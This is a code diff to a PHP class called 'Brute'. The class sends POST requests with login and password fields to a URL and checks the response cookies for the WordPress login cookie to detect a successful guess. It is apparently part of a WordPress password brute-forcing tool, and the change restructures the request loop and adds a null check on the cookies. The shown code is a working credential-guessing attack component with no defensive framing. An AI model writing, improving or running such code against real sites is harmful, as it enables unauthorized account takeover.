@@ -28,25 +28,29 @@ class Brute
         $login      = $this->loginCheck($data);
         $password   = $this->passwordCheck($data, $login);
         $iteration  = $this->checkIterator($data, $login, $password);
-
-        $log = new Logger('name');
         $authorized = false;
 
-        $body = new FormBody;
-        $body->addField('log', $login);
-        $body->addField('pwd', $password);
-
-        $request = new Request($url, 'POST');
-        $request->setTcpConnectTimeout(2400);
-        $request->setBody($body);
+        $log = new Logger('name');
 
         if ($iteration == true) {
-            $response = yield $this->client->request($request);
-            $cookies = $response->getHeaders()['set-cookie'];
+            $log = new Logger('name');
 
-            foreach ($cookies as $cookie) {
-                if (str_contains($cookie, static::WP_COOKIE_LOGIN))
-                    $authorized = true;
+            $body = new FormBody;
+            $body->addField('log', $login);
+            $body->addField('pwd', $password);
+
+            $request = new Request($url, 'POST');
+            $request->setTcpConnectTimeout(2400);
+            $request->setBody($body);
+
+            $response = yield $this->client->request($request);
+            $cookies = isset($response->getHeaders()['set-cookie']) ? $response->getHeaders()['set-cookie'] : null;
+
+            if ($cookies) {
+                foreach ($cookies as $cookie) {
+                    if (str_contains($cookie, static::WP_COOKIE_LOGIN))
+                        $authorized = true;
+                }
             }
 
             if ($authorized == true) {
